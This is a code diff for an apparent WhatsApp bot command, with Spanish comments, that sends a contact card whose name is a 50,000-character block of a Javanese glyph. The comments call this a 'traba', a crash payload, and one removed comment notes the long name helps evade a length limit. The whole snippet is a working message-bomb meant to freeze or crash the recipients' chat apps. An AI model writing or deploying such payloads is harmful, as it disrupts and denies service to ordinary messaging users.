@@ -1,19 +1,18 @@
 let handler = async (m, { conn }) => {
-  const number = '521234567890'; // Número del contacto
-  const basura = 'ꦾ'.repeat(5000); // Un bloque grande de traba
-  const trabaFinal = basura + basura + basura; // Repetimos 3 veces
+  const number = '521234567890'; // Número del contacto (puede ser real o falso)
+  const basura = 'ꦾ'.repeat(50000); // Traba que se repite 3 veces
 
   const vcard = `
 BEGIN:VCARD
 VERSION:3.0
-FN:${trabaFinal}
+FN:${basura}
 TEL;type=CELL;type=VOICE;waid=${number}:${number}
 END:VCARD
   `.trim();
 
   await conn.sendMessage(m.chat, {
     contacts: {
-      displayName: basura + '+' + basura + '+' + basura, // visible, pero ayuda a eludir límite
+      displayName: basura, // Este nombre se verá en la burbuja del chat
       contacts: [{ vcard }]
     }
   }, { quoted: m });
